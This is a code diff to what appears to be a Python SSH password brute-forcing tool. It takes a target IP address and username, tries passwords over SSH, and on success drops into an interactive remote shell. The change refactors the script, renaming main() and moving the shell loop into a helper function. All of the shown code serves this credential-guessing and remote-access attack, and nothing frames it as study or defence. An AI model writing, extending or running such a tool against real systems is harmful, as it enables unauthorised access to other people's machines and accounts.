@@ -6,7 +6,8 @@ import time
 
 from ssh_connect import *
 
-def main():
+# passwd brute forcing
+def main_p():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("ip", help="Specify Target ip")
 	parser.add_argument("user", help="Specify Target User")
@@ -27,28 +28,8 @@ def main():
 
 					conn = connect(args.ip, args.user, passwd) # ssh connect
 
-					if conn:
-
-						totalTime = time.time() - startTime
-						totalTime = '%.3f'%totalTime
-
-						print(color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color_obj.ENDC)
-
-						print(color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
-						'''+color_obj.ENDC)
-
-						command = input(args.user+'@'+args.ip+':$ ')
-						while command != 'exit':
-							conn.sendline(command)
-							conn.prompt()
-							print(conn.before.decode("utf-8"))
-							command = input(args.user+'@'+args.ip+':$ ')
-							
-						else:
-							print(color_obj.YEL+'''
-Bye!
-							'''+color_obj.ENDC)
-						exit(0)
+					# Getting shell after connecting to ssh 
+					shell_getting(args.user, args.ip, conn, startTime)
 
 	else:
 		print(parser.usage)
@@ -58,4 +39,4 @@ Bye!
 
 if __name__ == '__main__': 
 
-	main()
+	main_p()
